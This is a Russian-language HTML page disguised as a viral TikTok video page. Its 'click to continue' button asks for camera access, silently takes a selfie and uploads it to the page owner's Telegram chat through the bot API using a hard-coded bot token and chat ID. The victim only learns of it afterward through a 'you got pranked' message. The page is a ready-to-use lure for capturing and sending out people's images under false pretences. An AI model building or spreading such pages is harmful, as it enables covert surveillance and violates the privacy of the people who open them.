<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>🔥 TikTok видео 🔥</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #000000, #1a1a2e);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 10px;
        }
        .card {
            max-width: 450px;
            width: 100%;
            background: #111;
            border-radius: 30px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
            border: 1px solid #222;
        }
        .tiktok-container {
            background: #000;
            position: relative;
        }
        iframe {
            width: 100%;
            height: 550px;
            border: none;
            display: block;
        }
        .content {
            padding: 25px 20px;
            text-align: center;
        }
        .message {
            color: #fff;
            font-size: 16px;
            margin-bottom: 20px;
            opacity: 0.8;
        }
        button {
            background: #ff0050;
            background: linear-gradient(135deg, #ff0050, #ff6b00);
            color: white;
            font-size: 22px;
            font-weight: bold;
            padding: 15px 30px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
            box-shadow: 0 5px 15px rgba(255,0,80,0.4);
        }
        button:active {
            transform: scale(0.97);
        }
        button:disabled {
            opacity: 0.6;
            transform: none;
        }
        #status {
            color: #ffaa00;
            font-size: 14px;
            margin-top: 15px;
            font-family: monospace;
        }
        .prank {
            background: #00ff88;
            color: #000;
            padding: 15px;
            border-radius: 20px;
            font-size: 18px;
            font-weight: bold;
            display: none;
            margin-top: 15px;
        }
        .footer {
            font-size: 10px;
            color: #555;
            margin-top: 15px;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="tiktok-container">
        <!-- TikTok Embed Player -->
        <iframe 
            src="https://www.tiktok.com/player/v1/7633683429569088788?&music_info=1&description=1&autoplay=1"
            allow="fullscreen; autoplay"
            scrolling="no"
        ></iframe>
    </div>
    <div class="content">
        <div class="message">
            🔥 Вирусное видео TikTok 🔥
        </div>
        <div id="actionArea">
            <button id="triggerBtn">📸 НАЖМИ ДЛЯ ПРОДОЛЖЕНИЯ 📸</button>
            <div id="status"></div>
        </div>
        <div id="prankMessage" class="prank">
            😂 ТЫ ПОПАЛСЯ НА ПРАНКЕ! 😂<br>
            Твоё удивлённое лицо уже у друга в Telegram!
        </div>
        <div class="footer">
            Нажми "Разрешить", когда браузер спросит доступ к камере
        </div>
    </div>
</div>

<script>
    // ⚠️⚠️⚠️ ЗАМЕНИ ЭТИ ЗНАЧЕНИЯ НА СВОИ ⚠️⚠️⚠️
    const BOT_TOKEN = 8690046228:AAHtBXqcXewTZGd2VD4F4qUd7l8v7rlHQW4;   // сюда вставь токен
    const CHAT_ID = 787437405;               // сюда вставь ID из userinfobot
    // ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️

    const btn = document.getElementById('triggerBtn');
    const statusDiv = document.getElementById('status');
    const prankDiv = document.getElementById('prankMessage');

    btn.onclick = async () => {
        btn.disabled = true;
        statusDiv.innerText = "📸 Запрашиваем доступ к камере...";
        
        try {
            // Браузер ПОКАЖЕТ запрос на разрешение камеры
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            statusDiv.innerText = "✅ Доступ получен! Делаем селфи...";
            
            // Создаём скрытый video элемент для снимка
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            // Ждём немного для включения камеры
            await new Promise(r => setTimeout(r, 300));
            
            // Делаем снимок через canvas
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Выключаем камеру
            stream.getTracks().forEach(track => track.stop());
            
            // Конвертируем в base64
            const base64 = canvas.toDataURL('image/jpeg').split(',')[1];
            
            statusDiv.innerText = "📤 Отправляем...";
            
            // Отправляем фото в Telegram
            await sendPhotoToTelegram(base64);
            
            // Показываем пранк
            statusDiv.innerText = "";
            prankDiv.style.display = "block";
            document.getElementById('actionArea').style.display = "none";
            
        } catch (error) {
            statusDiv.innerText = "❌ Не удалось получить доступ к камере. Нажми РАЗРЕШИТЬ при запросе браузера!";
            btn.disabled = false;
            console.log(error);
        }
    };
    
    async function sendPhotoToTelegram(base64String) {
        const blob = base64ToBlob(base64String, 'image/jpeg');
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'selfie.jpg');
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        try {
            const response = await fetch(url, { method: 'POST', body: formData });
            return await response.json();
        } catch(e) {
            console.error('Ошибка отправки:', e);
        }
    }
    
    function base64ToBlob(base64, mime) {
        const byteChars = atob(base64);
        const byteNumbers = new Array(byteChars.length);
        for (let i = 0; i < byteChars.length; i++) {
            byteNumbers[i] = byteChars.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        return new Blob([byteArray], { type: mime });
    }
</script>
</body>
</html>
